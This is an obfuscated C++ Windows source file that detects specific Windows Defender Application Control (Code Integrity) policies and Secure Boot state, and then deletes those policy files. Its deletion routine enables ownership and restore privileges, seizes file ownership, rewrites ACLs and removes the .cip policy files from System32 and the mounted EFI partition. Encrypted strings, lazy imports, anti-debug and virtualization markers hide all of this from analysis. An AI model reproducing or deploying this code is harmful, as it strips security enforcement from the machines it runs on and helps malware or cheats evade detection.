#include "ciguard.hpp"
#include <windows.h>
#include <aclapi.h>
#include <sddl.h>
#include <stdio.h>
#include "pxstr.hpp"
#include "pxenc.hpp"
#include "lazy_importer.hpp"
#include "brkida.hpp"
#include "agent_stubs.hpp"

#pragma comment(lib, "advapi32.lib")

static
bool
FileExistsW(
    const wchar_t* p
)
{
    DWORD a = LI_KERNEL(GetFileAttributesW)(p);
    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
}

#define KG_CIGUARD_ENFORCEMENT_ID "8F9CB695-5D48-48D6-A329-7202B44607E3"
#define KG_CIGUARD_EVALUATION_ID  "784C4414-79F4-4C32-A6A5-F0FB42A51D0D"

static
size_t
CaseInsensitiveFind(
    const char* Haystack,
    size_t      HaystackLen,
    const char* Needle
)
{
    size_t nlen = strlen(Needle);
    if (nlen == 0 || HaystackLen < nlen) return (size_t)-1;
    for (size_t i = 0; i + nlen <= HaystackLen; i++) {
        size_t j = 0;
        while (j < nlen) {
            char a = Haystack[i + j];
            char b = Needle[j];
            if (a >= 'A' && a <= 'Z') a = (char)(a + 32);
            if (b >= 'A' && b <= 'Z') b = (char)(b + 32);
            if (a != b) break;
            j++;
        }
        if (j == nlen) return i;
    }
    return (size_t)-1;
}

static
bool
CitoolCapture(
    char** Out,
    ULONG* OutLen
)
{
    *Out = NULL;
    *OutLen = 0;

    wchar_t sysroot[MAX_PATH] = { 0 };
    if (LI_KERNEL(GetSystemDirectoryW)(sysroot, MAX_PATH) == 0) return false;

    wchar_t cmd[MAX_PATH + 64] = { 0 };
    if (_snwprintf_s(cmd, _TRUNCATE, PX_WS(L"\"%ls\\citool.exe\" -lp -json"), sysroot) < 0)
        return false;

    if (!FileExistsW((wchar_t*)cmd + 1)) {
        wchar_t exe[MAX_PATH];
        if (_snwprintf_s(exe, _TRUNCATE, PX_WS(L"%ls\\citool.exe"), sysroot) < 0) return false;
        if (!FileExistsW(exe)) return false;
    }

    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE rd = NULL, wr = NULL;
    if (!LI_KERNEL(CreatePipe)(&rd, &wr, &sa, 0)) return false;
    LI_KERNEL(SetHandleInformation)(rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { 0 };
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput  = wr;
    si.hStdError   = wr;
    si.hStdInput   = LI_KERNEL(GetStdHandle)(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = { 0 };
    BOOL ok = LI_KERNEL(CreateProcessW)(NULL, cmd, NULL, NULL, TRUE,
                                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    LI_KERNEL(CloseHandle)(wr);
    if (!ok) {
        LI_KERNEL(CloseHandle)(rd);
        return false;
    }

    ULONG cap = 65536, used = 0;
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, cap);
    if (!buf) {
        LI_KERNEL(CloseHandle)(rd);
        LI_KERNEL(CloseHandle)(pi.hThread);
        LI_KERNEL(CloseHandle)(pi.hProcess);
        return false;
    }

    for (;;) {
        if (used + 4096 > cap) {
            ULONG ncap = cap * 2;
            if (ncap > 4 * 1024 * 1024) break;
            char* nb = (char*)HeapReAlloc(GetProcessHeap(), 0, buf, ncap);
            if (!nb) break;
            buf = nb; cap = ncap;
        }
        DWORD got = 0;
        BOOL r = LI_KERNEL(ReadFile)(rd, buf + used, cap - used - 1, &got, NULL);
        if (!r || got == 0) break;
        used += got;
    }
    buf[used] = 0;

    LI_KERNEL(WaitForSingleObject)(pi.hProcess, 8000);
    LI_KERNEL(CloseHandle)(rd);
    LI_KERNEL(CloseHandle)(pi.hThread);
    LI_KERNEL(CloseHandle)(pi.hProcess);

    if (used == 0) {
        HeapFree(GetProcessHeap(), 0, buf);
        return false;
    }

    *Out    = buf;
    *OutLen = used;
    return true;
}

static
bool
PolicyIsActive(
    const char* Buf,
    ULONG       BufLen,
    const char* PolicyId
)
{
    size_t idAt = CaseInsensitiveFind(Buf, BufLen, PolicyId);
    if (idAt == (size_t)-1) return false;

    size_t objStart = idAt;
    while (objStart > 0 && Buf[objStart] != '{') objStart--;

    size_t objEnd = idAt;
    int depth = 1;
    while (objEnd < BufLen && depth > 0) {
        objEnd++;
        if (Buf[objEnd] == '{') depth++;
        else if (Buf[objEnd] == '}') depth--;
    }
    if (objEnd >= BufLen) return false;

    size_t span = objEnd - objStart;
    const char* obj = Buf + objStart;

    if (CaseInsensitiveFind(obj, span, PX_AS("\"IsEnforced\":true"))   == (size_t)-1 &&
        CaseInsensitiveFind(obj, span, PX_AS("\"IsEnforced\" : true")) == (size_t)-1 &&
        CaseInsensitiveFind(obj, span, PX_AS("\"IsEnforced\":  true")) == (size_t)-1)
        return false;

    if (CaseInsensitiveFind(obj, span, PX_AS("\"IsAuthorized\":true"))   == (size_t)-1 &&
        CaseInsensitiveFind(obj, span, PX_AS("\"IsAuthorized\" : true")) == (size_t)-1 &&
        CaseInsensitiveFind(obj, span, PX_AS("\"IsAuthorized\":  true")) == (size_t)-1)
        return false;

    return true;
}

KG_CI_STATE
CiGuardCheckState(
)
{
    BRKIDA;
    volatile int _vm_seal = 0;
    KG_CI_STATE  result   = KgCiStateOk;

    VIRTUALIZER_START

    char* out    = NULL;
    ULONG outLen = 0;
    bool  gotCitool = CitoolCapture(&out, &outLen);

    if (gotCitool) {
        if (PolicyIsActive(out, outLen, KG_CIGUARD_ENFORCEMENT_ID))
            result = KgCiStateEnforcement;
        else if (PolicyIsActive(out, outLen, KG_CIGUARD_EVALUATION_ID))
            result = KgCiStateEvaluation;
        HeapFree(GetProcessHeap(), 0, out);
    } else {
        wchar_t sysroot[MAX_PATH] = { 0 };
        UINT n = LI_KERNEL(GetSystemDirectoryW)(sysroot, MAX_PATH);
        if (n > 0 && n < MAX_PATH) {
            wchar_t enforcement[MAX_PATH];
            wchar_t evaluation[MAX_PATH];
            _snwprintf_s(enforcement, _TRUNCATE,
                PX_WS(L"%ls\\CodeIntegrity\\CiPolicies\\Active\\{8F9CB695-5D48-48D6-A329-7202B44607E3}.cip"),
                sysroot);
            _snwprintf_s(evaluation, _TRUNCATE,
                PX_WS(L"%ls\\CodeIntegrity\\CiPolicies\\Active\\{784C4414-79F4-4C32-A6A5-F0FB42A51D0D}.cip"),
                sysroot);

            if (FileExistsW(enforcement)) result = KgCiStateEnforcement;
            else if (FileExistsW(evaluation)) result = KgCiStateEvaluation;
        }
    }

    VIRTUALIZER_END

    _vm_seal = 1;
    (void)_vm_seal;
    return result;
}

bool
CiGuardSecureBootEnabled(
)
{
    BRKIDA;
    HKEY hk = NULL;
    LONG s = LI_ADVAPI(RegOpenKeyExW)(HKEY_LOCAL_MACHINE,
        pxenc(L"SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State"),
        0, KEY_READ, &hk);
    if (s != ERROR_SUCCESS) return false;

    DWORD val = 0, sz = sizeof(val), type = 0;
    LONG r = LI_ADVAPI(RegQueryValueExW)(hk, pxenc(L"UEFISecureBootEnabled"),
                                          NULL, &type, (LPBYTE)&val, &sz);
    LI_ADVAPI(RegCloseKey)(hk);
    return r == ERROR_SUCCESS && type == REG_DWORD && val == 1;
}

static
bool
EnableSelfPrivilege(
    const wchar_t* Name
)
{
    HANDLE tok = NULL;
    if (!LI_ADVAPI(OpenProcessToken)(LI_KERNEL(GetCurrentProcess)(),
                                     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return false;

    TOKEN_PRIVILEGES tp = { 0 };
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LI_ADVAPI(LookupPrivilegeValueW)(NULL, Name, &tp.Privileges[0].Luid)) {
        LI_KERNEL(CloseHandle)(tok);
        return false;
    }

    LI_ADVAPI(AdjustTokenPrivileges)(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD e = LI_KERNEL(GetLastError)();
    LI_KERNEL(CloseHandle)(tok);
    return e == ERROR_SUCCESS;
}

static
PSID
GetCurrentUserSid(
    BYTE* Buf,
    DWORD BufLen
)
{
    HANDLE tok = NULL;
    if (!LI_ADVAPI(OpenProcessToken)(LI_KERNEL(GetCurrentProcess)(), TOKEN_QUERY, &tok))
        return NULL;

    DWORD need = 0;
    LI_ADVAPI(GetTokenInformation)(tok, TokenUser, NULL, 0, &need);
    if (need == 0 || need > BufLen) { LI_KERNEL(CloseHandle)(tok); return NULL; }

    if (!LI_ADVAPI(GetTokenInformation)(tok, TokenUser, Buf, BufLen, &need)) {
        LI_KERNEL(CloseHandle)(tok);
        return NULL;
    }

    LI_KERNEL(CloseHandle)(tok);
    return ((PTOKEN_USER)Buf)->User.Sid;
}

static
void
TakeAndDelete(
    const wchar_t* Path,
    PSID           MySid
)
{
    if (!FileExistsW(Path)) return;

    LI_ADVAPI(SetNamedSecurityInfoW)((LPWSTR)Path, SE_FILE_OBJECT,
                                     OWNER_SECURITY_INFORMATION,
                                     MySid, NULL, NULL, NULL);

    EXPLICIT_ACCESSW ea = { 0 };
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode        = SET_ACCESS;
    ea.grfInheritance       = NO_INHERITANCE;
    ea.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType  = TRUSTEE_IS_USER;
    ea.Trustee.ptstrName    = (LPWSTR)MySid;

    PACL newDacl = NULL;
    if (LI_ADVAPI(SetEntriesInAclW)(1, &ea, NULL, &newDacl) == ERROR_SUCCESS && newDacl) {
        LI_ADVAPI(SetNamedSecurityInfoW)((LPWSTR)Path, SE_FILE_OBJECT,
                                         DACL_SECURITY_INFORMATION,
                                         NULL, NULL, newDacl, NULL);
        LI_KERNEL(LocalFree)(newDacl);
    }

    LI_KERNEL(SetFileAttributesW)(Path, FILE_ATTRIBUTE_NORMAL);
    LI_KERNEL(DeleteFileW)(Path);
}

static
bool
RunMountvol(
    const wchar_t* Arg
)
{
    wchar_t cmd[128] = { 0 };
    _snwprintf_s(cmd, _TRUNCATE, PX_WS(L"mountvol S: %ls"), Arg);

    STARTUPINFOW si = { 0 }; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };
    BOOL ok = LI_KERNEL(CreateProcessW)(NULL, cmd, NULL, NULL, FALSE,
                                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!ok) return false;

    LI_KERNEL(WaitForSingleObject)(pi.hProcess, 5000);
    LI_KERNEL(CloseHandle)(pi.hProcess);
    LI_KERNEL(CloseHandle)(pi.hThread);
    return true;
}

bool
CiGuardDeletePolicies(
)
{
    BRKIDA;
    volatile int _vm_seal = 0;
    VIRTUALIZER_START
    EnableSelfPrivilege(pxenc(L"SeTakeOwnershipPrivilege"));
    EnableSelfPrivilege(pxenc(L"SeRestorePrivilege"));
    EnableSelfPrivilege(pxenc(L"SeBackupPrivilege"));
    EnableSelfPrivilege(pxenc(L"SeSecurityPrivilege"));

    BYTE sidBuf[256] = { 0 };
    PSID mySid = GetCurrentUserSid(sidBuf, sizeof(sidBuf));
    if (!mySid) return false;

    wchar_t sysroot[MAX_PATH] = { 0 };
    if (LI_KERNEL(GetSystemDirectoryW)(sysroot, MAX_PATH) == 0) return false;

    wchar_t winPath1[MAX_PATH], winPath2[MAX_PATH];
    _snwprintf_s(winPath1, _TRUNCATE,
        PX_WS(L"%ls\\CodeIntegrity\\CiPolicies\\Active\\{8F9CB695-5D48-48D6-A329-7202B44607E3}.cip"),
        sysroot);
    _snwprintf_s(winPath2, _TRUNCATE,
        PX_WS(L"%ls\\CodeIntegrity\\CiPolicies\\Active\\{784C4414-79F4-4C32-A6A5-F0FB42A51D0D}.cip"),
        sysroot);

    TakeAndDelete(winPath1, mySid);
    TakeAndDelete(winPath2, mySid);

    RunMountvol(pxenc(L"/s"));

    TakeAndDelete(PX_WS(L"S:\\EFI\\Microsoft\\Boot\\CiPolicies\\Active\\{8F9CB695-5D48-48D6-A329-7202B44607E3}.cip"), mySid);
    TakeAndDelete(PX_WS(L"S:\\EFI\\Microsoft\\Boot\\CiPolicies\\Active\\{784C4414-79F4-4C32-A6A5-F0FB42A51D0D}.cip"), mySid);

    RunMountvol(pxenc(L"/d"));
    VIRTUALIZER_END
    _vm_seal = 1;
    (void)_vm_seal;
    return true;
}
